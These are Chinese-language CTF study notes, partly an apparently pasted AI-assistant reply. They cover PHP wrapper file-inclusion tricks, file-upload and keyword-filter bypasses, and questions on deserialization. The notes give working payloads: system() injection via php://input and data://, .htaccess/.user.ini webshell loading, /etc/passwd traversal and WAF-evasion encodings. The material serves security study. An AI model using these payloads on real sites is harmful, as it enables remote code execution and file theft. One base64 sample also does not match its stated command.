PHP提供了一系列内置协议，用于在执行文件操作（如 `include`, `file_get_contents`, `copy` 等）时改变数据流的处理方式。

### 1. php://filter（CTF中最常用）

这是读取源代码的“神技”。当目标代码执行了 `include($file)` 但你无法直接读取 `.php` 文件的内容时，可以使用此协议进行 **Base64 编码**，防止代码被服务器解析执行，从而拿到源码。

* **基本模板：**
`php://filter/read=convert.base64-encode/resource=flag.php`
* **进阶用法（绕过过滤器）：**
如果过滤了 `base64`，可以尝试其他转换器：
* `php://filter/read=string.rot13/resource=flag.php`（ROT13编码）
* `php://filter/read=convert.quoted-printable-encode/resource=flag.php`


* **多种过滤器嵌套：**
`php://filter/read=convert.base64-encode|string.rot13/resource=flag.php`

### 2. php://input

用于读取 POST 数据包中的 **Raw Data**。如果 `allow_url_include` 为 **On**，可以将 POST 内容作为代码执行。

* **用法：**
* URL: `?file=php://input`
* POST Body: `<?php system('ls'); ?>`



### 3. data://

数据协议，直接将代码嵌入 URL 中。同样需要 `allow_url_include=On`。

* **用法：**
* 明文：`data://text/plain,<?php system('whoami');?>`
* Base64编码（绕过WAF）：`data://text/plain;base64,PD9waHAgc3lzdGVtKCdscCcpOz8+`



### 4. phar:// 与 zip://

这两个协议常用于**绕过文件上传限制**。如果你只能上传 `.jpg` 或 `.zip`，可以将 PHP 代码压缩后再访问。

* **zip://** (需要绝对路径)
1. 将 `shell.php` 压缩为 `test.zip`。
2. 访问：`file=zip:///var/www/html/test.zip#shell.php`（注意 `#` 在 URL 中需编码为 `%23`）。


* **phar://**
1. 类似 zip，但不需要绝对路径，常用于反序列化攻击。
2. 访问：`file=phar://test.phar/shell.php`



---

## 二、 文件上传中的加密与绕过技巧

当后端有检测机制（WAF/黑名单/内容过滤）时，需要对 Payload 进行变形。

### 1. 编码与加解密绕过

如果后端检测 `<?php` 或 `eval` 等关键字：

* **短标签（Short Tags）：**
`<?= system('ls'); ?>` (等同于 `<?php echo ...`)
* **JavaScript 风格（旧版本PHP）：**
`<script language="php"> system('ls'); </script>`
* **利用异或/取反（无字母数字RCE）：**
通过不可见字符进行位运算生成想要的字符。
* 示例：`$_ = ('@'^'#');`



### 2. .htaccess / .user.ini 解析突破

如果无法直接上传 PHP，但可以上传配置文件：

* **Apache (.htaccess)：**
上传一个 `.htaccess` 文件，内容如下，强制将所有文件（或特定文件）解析为 PHP：
```apache
AddType application/x-httpd-php .jpg

```


* **Nginx/PHP-FPM (.user.ini)：**
如果目录下存在 PHP 文件，上传 `.user.ini` 包含后门：
```ini
auto_prepend_file=shell.jpg

```



### 3. 图片马与文件头绕过

后端通过 `getimagesize()` 或检查文件头（Magic Bytes）来判断类型。

* **添加伪造头：**
在 PHP 代码前添加：`GIF89a` (GIF) 或 `\xff\xd8\xff` (JPEG)。
* **二次渲染绕过：**
如果后端使用 GD 库重新生成图片，你需要找到图片中**经过渲染后依然保持不变的像素区域**，将 PHP 代码嵌入该区域。

---

## 三、 CTF 常见过滤绕过总结表

| 过滤对象 | 绕过手段 |
| --- | --- |
| **`<?php`** | `<?=`, `<script language="php">`, 或者是 Base64 编码后通过 `php://filter` 写入 |
| **空格** | `%09` (Tab), `$IFS`, `{cmd,arg}` |
| **引号** | 使用十六进制（`0x666c6167`）或 `chr()` 函数 |
| **文件名后缀** | `.phtml`, `.php3`, `.php5`, `.phps`, `.pht` |
| **目录限制** | `../../../../etc/passwd` (目录穿越) |
| **特定函数** | `system` -> `passthru`, `shell_exec`, `popen`, ``` (反引号) |

---

## 四、 深度技巧：Filter Chain (过滤器链)

在一些极端的 CTF 题目中，如果你只能控制 `include` 的路径，但无法控制文件内容，且没有现成的文件可利用，可以使用 **PHP Filter Chain** 构造出任意代码。

其原理是通过 `convert.iconv.*` 过滤器不断转换编码，在内存流中“拼凑”出想要的字符，最终生成一个完整的 Base64 字符串并解码执行。这种方法不需要服务器上有任何现成文件，甚至不需要 `allow_url_include` 为 On。

> **提示：** 这种 Payload 通常极长（几万个字符），可以使用现成的工具如 `php_filter_chain_generator` 生成。

---

**您是正在练习某道具体的 CTF 题目吗？如果有具体的过滤代码（PHP源码），我可以为您提供更针对性的绕过 Payload 编写建议。**

</details>

#### 反序列化漏洞

- 为什么有些php只需要上传一个序列化代码，就算php里没看到unserialize()也能进行反序列化？
- 一般反序列化的作用是什么？
- 如何手动写一个序列化数据脚本？
- 什么是反序列化漏洞？
- 反序列化中常见的魔术方法都有哪些？
- __wakeup(){}有什么用？
- 序列化数据中从php7.1以后对于属性的类型不敏感的体现在哪？
- 为什么最好要对类型为protected和private的属性修改类型为public？
- 如果序列化字符内有不可打印字符，可能会有什么后果？
- preg_match和is_valid函数是什么的克星(提示：%00)？

<details>
<summary>现在来看题</summary>

```php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```
- 为什么首先考虑绕过exit()（即使这里没有任何可见代码表明绕过exit会有用）？
- 如何绕过这里的exit？
- 如何构建序列化？
